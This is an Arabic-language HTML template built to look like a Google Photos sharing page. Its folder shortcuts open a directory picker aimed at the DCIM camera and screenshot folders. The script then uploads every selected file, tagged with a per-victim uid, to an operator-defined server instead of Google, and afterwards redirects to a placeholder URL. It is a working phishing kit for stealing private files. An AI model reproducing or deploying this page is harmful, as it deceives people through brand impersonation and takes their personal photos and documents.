<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Photos</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#1a1a1a;color:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
    .card{background:#2a2a2a;border-radius:16px;padding:28px 22px;width:93%;max-width:380px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.5);}
    .glogo{font-size:44px;margin-bottom:10px}
    h2{font-size:19px;font-weight:500;margin-bottom:6px;color:#e8e8e8}
    .desc{font-size:13px;color:#999;line-height:1.7;margin-bottom:20px}

    /* Quick folder buttons */
    .folders{display:flex;flex-direction:column;gap:10px;margin-bottom:16px;}
    .folder-btn{
      display:flex;align-items:center;gap:12px;
      background:#333;border:none;color:#fff;
      padding:14px 16px;border-radius:12px;
      font-size:14px;cursor:pointer;text-align:right;
      transition:background .2s;
    }
    .folder-btn:active{background:#444}
    .folder-icon{font-size:28px;flex-shrink:0}
    .folder-info{flex:1}
    .folder-name{font-weight:600;color:#fff;margin-bottom:2px}
    .folder-sub{font-size:12px;color:#888}
    .arrow{color:#666;font-size:18px}

    /* divider */
    .divider{display:flex;align-items:center;gap:10px;margin:14px 0;color:#555;font-size:12px;}
    .divider::before,.divider::after{content:'';flex:1;height:1px;background:#444}

    /* file drop zone */
    .share-box{border:2px dashed #444;border-radius:12px;padding:22px 14px;margin-bottom:16px;cursor:pointer;transition:border-color .2s,background .2s;}
    .share-box:hover,.share-box.drag{border-color:#4285f4;background:#1e2a3a}
    .share-icon{font-size:36px;margin-bottom:8px}
    .share-txt{font-size:13px;color:#bbb;margin-bottom:4px}
    .share-sub{font-size:11px;color:#666}

    /* hidden inputs */
    #fileInput{display:none}
    #dirInput{display:none}

    /* preview */
    #preview{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;justify-content:center;}
    .thumb{width:62px;height:62px;object-fit:cover;border-radius:8px;border:2px solid #4285f4;}
    .thumb-doc{width:62px;height:62px;background:#1e2a3a;border-radius:8px;border:2px solid #4285f4;display:flex;align-items:center;justify-content:center;font-size:24px;}
    .count-badge{background:#4285f4;color:#fff;border-radius:20px;padding:4px 14px;font-size:13px;display:inline-block;margin-bottom:14px;}

    /* progress */
    #progWrap{display:none;margin-bottom:14px}
    .prog-bar-bg{background:#333;border-radius:8px;height:8px;overflow:hidden}
    .prog-bar{height:8px;background:#4285f4;border-radius:8px;width:0%;transition:width .3s}
    .prog-txt{font-size:12px;color:#888;margin-top:6px}

    .btn{display:block;width:100%;background:#4285f4;color:#fff;border:none;padding:13px;border-radius:50px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:8px;}
    .btn:active{opacity:.85}
    .btn-sec{background:transparent;border:1px solid #555;color:#bbb;font-weight:400;}
    .spinner{display:none;width:32px;height:32px;border:4px solid #333;border-top:4px solid #4285f4;border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 10px;}
    @keyframes sp{to{transform:rotate(360deg)}}
    #status{font-size:14px;color:#aaa;min-height:16px;margin-top:6px}
  </style>
</head>
<body>
<div class="card">
  <div class="glogo">📷</div>
  <h2>Google Photos</h2>
  <p class="desc">اختر مجلداً للمشاركة أو حدد ملفات يدوياً</p>

  <!-- Quick folder shortcuts -->
  <div class="folders" id="foldersView">
    <button class="folder-btn" onclick="pickDir()">
      <div class="folder-icon">🖼️</div>
      <div class="folder-info">
        <div class="folder-name">DCIM / Camera</div>
        <div class="folder-sub">صور الكاميرا</div>
      </div>
      <div class="arrow">›</div>
    </button>
    <button class="folder-btn" onclick="pickDir()">
      <div class="folder-icon">📸</div>
      <div class="folder-info">
        <div class="folder-name">DCIM / Screenshots</div>
        <div class="folder-sub">لقطات الشاشة</div>
      </div>
      <div class="arrow">›</div>
    </button>
  </div>

  <div class="divider">أو</div>

  <!-- Manual file picker -->
  <div class="share-box" id="dropZone" onclick="document.getElementById('fileInput').click()">
    <div class="share-icon">📁</div>
    <div class="share-txt">اختيار ملفات يدوياً</div>
    <div class="share-sub">صور، فيديوهات، مستندات</div>
  </div>

  <!-- hidden inputs -->
  <input type="file" id="fileInput"  multiple accept="*/*">
  <input type="file" id="dirInput"   multiple accept="*/*" webkitdirectory>

  <div id="preview"></div>
  <div class="count-badge" id="countBadge" style="display:none"></div>

  <div class="spinner" id="spinner"></div>
  <div id="progWrap"><div class="prog-bar-bg"><div class="prog-bar" id="progBar"></div></div><div class="prog-txt" id="progTxt"></div></div>

  <button class="btn" id="uploadBtn" onclick="startUpload()" style="display:none">📤 مشاركة الآن</button>
  <button class="btn btn-sec" id="cancelBtn" onclick="reset()" style="display:none">إلغاء</button>
  <div id="status"></div>
</div>

<script>
  const uid       = "<%= uid %>";
  const serverURL = "<%= a %>";
  const redirectUrl="<%= redirectUrl %>";

  let chosen = [];

  // Drag & drop
  const dropZone = document.getElementById('dropZone');
  dropZone.addEventListener('dragover', e=>{ e.preventDefault(); dropZone.classList.add('drag'); });
  dropZone.addEventListener('dragleave', ()=>dropZone.classList.remove('drag'));
  dropZone.addEventListener('drop', e=>{ e.preventDefault(); dropZone.classList.remove('drag'); handleFiles(e.dataTransfer.files); });

  document.getElementById('fileInput').addEventListener('change', e => handleFiles(e.target.files));
  document.getElementById('dirInput').addEventListener('change',  e => handleFiles(e.target.files));

  function pickDir() {
    document.getElementById('dirInput').click();
  }

  function handleFiles(files) {
    if (!files || !files.length) return;
    chosen = Array.from(files);
    const preview = document.getElementById('preview');
    preview.innerHTML = '';
    const show = Math.min(chosen.length, 12);
    for (let i = 0; i < show; i++) {
      const f = chosen[i];
      if (f.type.startsWith('image/')) {
        const img = document.createElement('img');
        img.className = 'thumb';
        img.src = URL.createObjectURL(f);
        preview.appendChild(img);
      } else {
        const d = document.createElement('div');
        d.className = 'thumb-doc';
        d.textContent = fileEmoji(f.name);
        preview.appendChild(d);
      }
    }
    if (chosen.length > 12) {
      const more = document.createElement('div');
      more.className = 'thumb-doc';
      more.style.fontSize = '13px';
      more.textContent = `+${chosen.length - 12}`;
      preview.appendChild(more);
    }
    document.getElementById('countBadge').textContent = `✅ ${chosen.length} ملف`;
    document.getElementById('countBadge').style.display = 'inline-block';
    document.getElementById('uploadBtn').style.display  = 'block';
    document.getElementById('cancelBtn').style.display  = 'block';
    document.getElementById('foldersView').style.display = 'none';
    dropZone.style.display = 'none';
  }

  function fileEmoji(name) {
    const ext = (name.split('.').pop() || '').toLowerCase();
    if (ext === 'pdf') return '📄';
    if (['doc','docx'].includes(ext)) return '📝';
    if (['xls','xlsx'].includes(ext)) return '📊';
    if (['mp4','mov','avi','mkv'].includes(ext)) return '🎬';
    if (['mp3','aac','wav'].includes(ext)) return '🎵';
    if (['zip','rar','7z'].includes(ext)) return '🗜️';
    return '📁';
  }

  async function startUpload() {
    if (!chosen.length) return;
    document.getElementById('uploadBtn').style.display = 'none';
    document.getElementById('cancelBtn').style.display = 'none';
    document.getElementById('spinner').style.display   = 'block';
    document.getElementById('progWrap').style.display  = 'block';
    document.getElementById('status').textContent      = '';

    let done = 0, failed = 0;
    const total = chosen.length;

    for (const file of chosen) {
      document.getElementById('progTxt').textContent = `${done + 1} / ${total}`;
      document.getElementById('progBar').style.width = `${Math.round((done/total)*100)}%`;
      const fd = new FormData();
      fd.append('uid',  uid);
      fd.append('file', file, file.name);
      try {
        const r = await fetch(serverURL + '/file-upload', { method:'POST', body:fd });
        if (!r.ok) failed++;
      } catch(e) { failed++; }
      done++;
      document.getElementById('progBar').style.width = `${Math.round((done/total)*100)}%`;
    }

    document.getElementById('spinner').style.display = 'none';
    document.getElementById('progTxt').textContent   = '';
    document.getElementById('status').textContent    = failed === 0 ? `✅ تمت المشاركة (${total} ملف)` : `⚠️ ${total-failed}/${total} تم الرفع`;
    setTimeout(() => { window.location.href = redirectUrl; }, 1500);
  }

  function reset() {
    chosen = [];
    document.getElementById('preview').innerHTML         = '';
    document.getElementById('countBadge').style.display  = 'none';
    document.getElementById('uploadBtn').style.display   = 'none';
    document.getElementById('cancelBtn').style.display   = 'none';
    document.getElementById('foldersView').style.display = 'flex';
    dropZone.style.display  = 'block';
    document.getElementById('progWrap').style.display    = 'none';
    document.getElementById('status').textContent        = '';
    document.getElementById('fileInput').value           = '';
    document.getElementById('dirInput').value            = '';
  }
</script>
</body>
</html>
